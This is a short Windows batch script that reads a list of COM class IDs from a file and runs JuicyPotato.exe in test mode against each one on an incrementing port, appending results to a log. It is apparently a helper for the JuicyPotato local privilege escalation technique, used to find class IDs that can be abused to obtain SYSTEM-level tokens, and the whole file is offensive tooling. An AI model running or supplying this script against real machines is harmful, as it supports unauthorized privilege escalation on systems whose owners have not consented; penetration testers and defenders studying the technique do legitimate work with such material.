@echo off
:: Starting port, you can change it
set /a port=10000
SETLOCAL ENABLEDELAYEDEXPANSION

FOR /F %%i IN (C:\timmy\CLSID.list) DO (
   echo %%i !port!
   C:\timmy\JuicyPotato.exe -z -l !port! -c %%i >> C:\timmy\result.log
   set RET=!ERRORLEVEL!
   :: echo !RET!
   if "!RET!" == "1"  set /a port=port+1
)